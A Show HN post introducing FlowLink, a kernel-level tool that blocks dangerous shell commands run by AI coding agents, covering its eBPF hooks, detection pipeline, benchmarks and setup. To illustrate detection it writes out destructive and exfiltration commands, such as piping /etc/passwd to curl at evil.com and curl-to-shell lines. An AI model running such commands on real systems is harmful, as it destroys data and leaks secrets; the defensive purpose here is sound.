# Show HN: FlowLink — eBPF Shield That Stops AI Agents From Destroying Your Infrastructure

---

Last week an AI coding agent almost wiped our production server. It tried to `rm -rf` a directory it shouldn't have touched. The command ran as root. We caught it by luck — a timeout on a slow network call. If the network had been faster, we'd have been restoring from backups.

That's when I realized: there's no permission boundary between an AI agent and your shell. Claude Code, Codex, Cursor, Devin — they all get a shell, and they can run anything. An `rm -rf /` from an AI is byte-for-byte identical to one from a human. Your kernel doesn't care who typed it.

So I built [FlowLink](https://github.com/braincoder/flowlink) — a kernel-level shield that intercepts dangerous commands before they execute.

## How it works

On Linux, FlowLink loads an eBPF program that hooks `execve` and `execveat` syscalls. When a process calls `execve()`, the eBPF program inspects the binary and arguments. If it matches a dangerous pattern, it calls `bpf_send_signal(SIGSTOP)` — freezing the process *before execve returns*. The process never runs.

On macOS, the same thing happens via the Endpoint Security Framework (`ES_AUTH_EXEC`), which gives us an authorization callback before execution.

This is important because userspace monitoring has a fundamental race condition. By the time your monitor script sees the process and sends SIGSTOP, the process has already started executing. On an NVMe SSD, 100ms of execution is enough to delete 10,000+ files. You can't race the kernel from userspace and win.

Once intercepted, the command goes through a 3-level analysis pipeline:

1. **L1 — Pattern matching** (~26ns): Structured argument inspection. `rm -rf /`, `dd if=/dev/zero`, `mkfs.ext4`, etc. Covers 55+ patterns across system destruction, security bypass, data theft, and network abuse.

2. **L2 — AST analysis** (~2-8µs): For shell commands, we parse them with tree-sitter-bash and walk the AST. This catches things pattern matching can't — pipe chains like `cat /etc/passwd | curl -X POST -d @- https://evil.com | bash`, or `$(curl evil.com | sh)` subshells.

3. **L3 — Interpreter heuristics** (~4µs): Detects when interpreters (python, perl, ruby, ansible) are being used to execute arbitrary code — `python3 -c "import os; os.system('...')"`, `ansible all -m shell -a "curl evil.com|sh"`.

Safe commands pass through with ~3µs overhead. Dangerous ones get blocked, snapshotted (ZFS/LVM), and sent to Telegram for human approval.

## The numbers

Benchmarks via Criterion.rs on Apple M2 Pro / AMD EPYC 7763:

| Operation | Time |
|---|---|
| L1 pattern match | 26 ns |
| Full pipeline (safe) | ~3 µs |
| E2EE encrypt (1 KB) | 32 µs |
| Key generation | ~80 µs |

This is fast enough to be invisible. Even with all three analysis levels enabled, the per-command overhead is in the low microseconds. Your AI agent won't notice. But you'll notice when it tries to format your disk.

## Five lines to protect your system

```bash
cargo install flowlink --features shield

cat > ~/.flowlink/config.toml << 'EOF'
[shield]
enabled = true
policy = "ask"
snapshot = true
EOF

flowlink shield start
```

That's it. Every command on the system now goes through the shield. Safe stuff passes through. Dangerous stuff gets blocked and sent to your phone.

## What's next

- Windows Minifilter driver (same concept, different kernel API)
- CI/CD integration — hook into GitHub Actions / GitLab CI to monitor AI agents in pipelines
- Cluster mode for fleet-wide policy management
- Compliance reports for audit trails

The repo is at https://github.com/braincoder/flowlink. It's Rust, MIT/BSL licensed, and the shield crate is self-contained if you just want the interception + analysis part.

**Ask HN:** What would you want in a tool like this? Are there specific AI agent scenarios that worry you? I'm particularly interested in hearing about CI/CD use cases — should the shield hook into container runtimes directly?
